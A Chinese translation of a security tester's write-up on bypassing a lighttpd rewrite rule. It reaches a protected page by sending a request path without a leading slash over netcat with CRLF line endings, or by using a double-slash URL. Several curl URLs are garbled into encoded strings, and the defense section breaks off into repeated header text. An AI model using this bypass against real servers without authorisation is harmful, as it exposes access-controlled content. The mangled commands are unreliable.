
# [翻译]无效的HTTP请求并绕过lighttpd中的重写规则

最近，在对一个托管在lighttpd服务器上的Web应用程序的测试中，我遇到了一个奇怪的情况，让我摸不着头脑，并且使用了我通常用于网络测试的技术。这篇文章记录了我是如何处理两个问题并发现lighttpd中一个有趣的导致意外漏洞的问题。

如果您不想阅读整篇文章，可以直接跳到问题和漏洞的摘要（见文末）。

## 故事

作为测试的一部分，客户端提供了文档根目录列表，在使用Intruder启动完整的扫描之前，我正在Burp的转发器中查看几个选择页面。有一页看起来非常有趣，叫`secret.html`。我提出了页面请求并获得了秘密内容：

![](https://bbs.kanxue.com/upload/attach/201902/93_R8UEWPPHKY9MQPA.jpg)

这似乎很容易，但我不抱怨。于是我转向了浏览器，输入URL并被告知“不，不能看到数据”。

![](https://bbs.kanxue.com/upload/attach/201902/93_J7FTUVZ494CJVPT.jpg)

这不在我的预料之内，也许它与会话相关，但在Burp的代理中查看到的请求看起来却非常相似。Firefox引入了一些额外的标题，但这是可以预料的。

![](https://bbs.kanxue.com/upload/attach/201902/93_YQZRC8XM6NPFYDB.jpg)

如果不用Firefox，我能用`curl`查看这些内容吗？打开我的Repeater选项卡，复制其的URL并将其放到命令行中：

```
$ curl -i 34aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0m8Q4x3X3f1&6x3%4y4W2j5%4u0W2N6q4)9J5k6h3S2@1L8h3H3`.
```

好吧，这看起来有点奇怪，URL被破坏了但我可以修复它：

```
$ curl -i cfbK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0m8Q4x3X3f1&6x3#2)9J5c8Y4y4W2j5%4u0W2N6q4)9J5k6h3S2@1L8h3H3`.

HTTP/1.1 200 OK

Content-Type: text/html

Accept-Ranges: bytes

ETag: "4177750045"

Last-Modified: Wed, 18 Apr 2018 22:36:19 GMT

Content-Length: 40

Date: Fri, 20 Apr 2018 19:28:13 GMT

Server: lighttpd/1.4.45



You are not allowed to see that content
```

这并不在我的预料之内，于是，我请求Burp给我一个`curl`命令以代替上述代码，并运行：

```
$ curl -i -s -k  -X $'GET' \
-H $'Host: 192.168.0.93' -H $'Connection: close' \
$'abcK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0m8Q4x3X3f1&6x3%4y4W2j5%4u0W2N6q4)9J5k6h3S2@1L8h3I4Q4x3U0M7`.
```

没有返回任何东西，有点头疼。我注意到URL又被破坏了。针对这一点，我应该意识到已经出了问题，但我没有，我只是修复了URL并再次进行尝试：

```
$ curl -i -s -k  -X $'GET' \
-H $'Host: 192.168.0.93' -H $'Connection: close' \
$'69eK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0m8Q4x3X3f1&6x3%4y4W2j5%4u0W2N6q4)9J5k6h3S2@1L8h3I4Q4x3U0M7`.

HTTP/1.1 200 OK

Content-Type: text/html

Accept-Ranges: bytes

ETag: "4177750045"

Last-Modified: Wed, 18 Apr 2018 22:36:19 GMT

Content-Length: 40

Date: Fri, 20 Apr 2018 19:29:32 GMT

Server: lighttpd/1.4.45



You are not allowed to see that content
```

好吧，非常奇怪。Burp可以得到秘密内容，但Firefox和`curl`不能。让我们试试`netcat`。我建立连接后，从Repeater选项卡中复制请求：

```
$ nc 192.168.0.93 80
GET secret.html HTTP/1.1
Host: 192.168.0.93
Connection: close
```

仍然没有返回任何东西，一直保持着连接但服务器没有响应。也许我犯了一个拼写错误，于是我将请求放入一个文件并尝试执行：

```
$ cat get_secret_request | nc 192.168.0.93 80
```

另一个挂连接，没有响应。在这一点上我真的很困惑，下面是我已经的得到的信息：

Burp可以获得秘密内容

`Curl`无法使用Burp提供的URL获取秘密

Burp提供的`curl`命令无法得到秘密

`netcat`的任何操作都会挂起

在这些请求之间必定存在着某些差异，但我看不到它们。让我们继续，使用Wireshark试试看。

首先，Burp请求：

![](https://i.imgur.com/BiUonAt.png)

接下来，使用由Burp创建的`curl`命令：

![](https://i.imgur.com/UTowCgS.png)

这里存在着一些差异，此请求具有`curl`用户代理和额外的accept标头。WAF和其他简单的保护系统经常回复用户代理检测，所以也许就这么简单，让我们再次尝试`curl`来删除这些额外的标头：

```
$ curl -i -s -k  -X $'GET' \
-H $'Host: 192.168.0.93' -H $'Connection: close' \
-H $'User-Agent:' -H $'Accept:' \
$'db1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0m8Q4x3X3f1&6x3#2)9J5c8Y4y4W2j5%4u0W2N6q4)9J5k6h3S2@1L8h3I4Q4x3U0M7`.
```

![](https://i.imgur.com/ezkEgbG.png)

仔细观察这些请求时发现它们都差不多，但紧接着我发现了差异。Burp请求的是`secret.html`，而`curl`请求的是`/secret.html`。这个额外的‘/’应当就是造成差异的原因，也能解释为什么Burp给我的URL和它创建的`curl`命令都缺少‘/’。Burp能够发出有指定页面名称的请求，但`curl`要求URL中要包含这个页面的名称。

看来我将无法使用`curl`重现请求，让我们回到`netcat`，看看是否可以知道失败的原因。我们检查Wireshark中的`netcat`连接：

![](https://i.imgur.com/IGb7FRv.png)

仔细观察这两个发送至`secret.html`页面（而不是`/secret.html`）的请求，你会发现它们都差不多，但一定还存在着一些细微的差别。十六进制视图是什么样的呢？

![](https://i.imgur.com/zYsl6bp.png)

![](https://i.imgur.com/OstkBSO.png)

经过一番观察，我终于发现了它们之间的差异。Burp请求是使用DOS行结尾（`\r\n`)，而`netcat`使用的是Unix（`\n`）。由于我已经在文件中得到了请求，使用`vim`就可更改行结尾，只需打开文件，输入：

```
:set ff=dos
```

然后将它保存。如果您不是vim用户，`dos2unix`包中的`unix2dos` App也是一种选择。

转换后，让我们再试一次：

```
$ cat get_secret_request_dos | nc 192.168.0.93 80

HTTP/1.1 200 OK

Content-Type: text/html

Accept-Ranges: bytes

ETag: "4169396764"

Last-Modified: Wed, 18 Apr 2018 22:42:18 GMT

Content-Length: 43

Connection: close

Date: Fri, 20 Apr 2018 21:35:12 GMT

Server: lighttpd/1.4.45



This is top secret stuff you shouldn't see
```

“中大奖了”！现在我可以通过`netcat`来重现请求了，让我们检查是否是‘/’导致了差异，将‘/’放到合适的位置并再次尝试：

```
$ cat get_secret_request_dos | nc 192.168.0.93 80

HTTP/1.1 200 OK

Content-Type: text/html

Accept-Ranges: bytes

ETag: "4177750045"

Last-Modified: Wed, 18 Apr 2018 22:36:19 GMT

Content-Length: 40

Connection: close

Date: Fri, 20 Apr 2018 21:39:01 GMT

Server: lighttpd/1.4.45



You are not allowed to see that content
```

因此，可请求`secret.html`提供访问权限，而请求`/secret.html`时会被拒绝。这种类型的请求不能通过浏览器或任何其他的将整个URL作为参数的工具来进行，该请求只能通过理解页面并且主机是两个独立实体的东西来进行。

所以现在我能重现这个问题，但我仍不知道第一个地方存在差异的原因。这很烦人，但我想我可以在某个时候与开发人员讨论它，看看他们是否有任何想法。

## 后来......

除了进行应用程序测试之外，客户端还要求审查服务器配置，并且作为审查的任务之一，他们还提供了一部分lighttpd配置，当我发现下面这一行时，我正在挣扎：

```
url.rewrite-once = (
    "^/secret.html" => "/not_permitted.html"
)
```

看起来相当简单，任何以`/secret.html`页面名称开头的请求，都将在内部重新定向到`/not\_permitted.html`。但是，由于我要请求的是`secret.html`，而不是`/secret.html`，这个规则不适用于我，我不会被重定向，因此可以查看秘密内容。

知道这一点，我想知道我是否可以使用`curl`或浏览器查看它的内容。我尝试的第一个网址是：

```
f11K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0m8Q4x3X3f1&6x3#2)9J5c8W2)9J5k6g2)9J5c8Y4y4W2j5%4u0W2N6q4)9J5k6h3S2@1L8h3H3`.
```

但`curl`和我尝试的所有浏览器在发出请求之前就被简化了，所以我最终还是使用了`/secret.html`。我尝试了各种`./`和`../`组合，都失败了，直到后面我使用下面的URL才成功：

```
206K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0m8Q4x3X3f1&6x3#2)9J5c8W2)9J5k6g2)9J5k6g2)9J5c8W2)9J5k6g2)9J5c8W2)9J5k6g2)9J5k6g2)9J5c8W2)9J5c8W2)9J5c8W2)9J5c8Y4y4W2j5%4u0W2N6q4)9J5k6h3S2@1L8h3H3`.
```

反转它直到它停止工作，我发现虽然点被简化了，但多余的斜线没有，所以后面的URL是有效的，并可获取秘密数据，因为所请求的页面是`//secret.html`，它与正则表达式相匹配。

```
ed1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0m8Q4x3X3f1&6x3#2)9J5c8W2)9J5c8Y4y4W2j5%4u0W2N6q4)9J5k6h3S2@1L8h3H3`.
```

在确认过这个URL能够在各种浏览器中工作后，我发现了一些可以写在报告中的可靠的利用例子。它需要一段时间来完成所有工作，但这比给出Repeater的截图并说“看，我得到你的数据但我不知道是如何得到它的”要好得多。

我想您已经了解了我是如何调试此漏洞的有用信息。它有助于表明计算机具有确定性，并且事情的背后都是有动机的，有时它只需要做一些工作来找出规则的定义。一旦你了解规则，就能更容易的参与和赢得比赛。

## 其他Web服务器

我决定尝试攻击Apache，NGINX和IIS，但它们都拒绝了我的请求，并返回了“400 Bad Request”。我还明确了它们都接受DOS或Unix行结尾。

### Apache

```
$ cat get_secret_request | nc 192.168.0.93 80

HTTP/1.1 400 Bad Request

Date: Fri, 20 Apr 2018 20:26:09 GMT

Server: Apache/2.4.25 (Debian)

Content-Length: 304

Connection: close

Content-Type: text/html; charset=iso-8859-1



<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at 192.168.0.93 Port 80</address>
</body></html>
```

错误日志文件中还有以下记录：

```
[Fri Apr 20 20:26:09.244512 2018] [core:error] [pid 31042] [client 192.168.0.3:47832] AH00126: Invalid URI in request GET secret.html HTTP/1.1
```

### NGINX

```
$ cat get_secret_request | nc 192.168.0.93 80

HTTP/1.1 400 Bad Request

Server: nginx/1.10.3

Date: Fri, 20 Apr 2018 19:22:39 GMT

Content-Type: text/html

Content-Length: 173

Connection: close



<html>
<head><title>400 Bad Request</title></head>
<body bgcolor="white">
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx/1.10.3</center>
</body>
</html>
```

NGINX日志文件中没有任何记录。

### IIS

```
$ cat get_secret_request_dos | nc microsoft.com 80

HTTP/1.1 400 Bad Request

Content-Type: text/html; charset=us-ascii

Server: Microsoft-HTTPAPI/2.0

Date: Sun, 22 Apr 2018 18:00:10 GMT

Connection: close

Content-Length: 324



<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Bad Request</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Bad Request - Invalid URL</h2>
<hr><p>HTTP Error 400. The request URL is invalid.</p>
</BODY></HTML>
```

我没有访问IIS日志来检查记录。

## 防御

无效的HTTP请求并绕过lighttpd中的重写规则 家 博客 无效的HTTP请求并绕过lighttpd中的重写规则 4月30日星期一18日 在最近对lighttpd服务器上托管的Web应用程序的测试中，我遇到了一个奇怪的情况，让我摸不着头脑并使用我通常用于网络测试的技术。这是我如何处理两个问题并发现lighttpd的一个有趣问题导致意外漏洞的故事。

如果您不想阅读整个故事，可以直接跳到问题和漏洞的摘要。
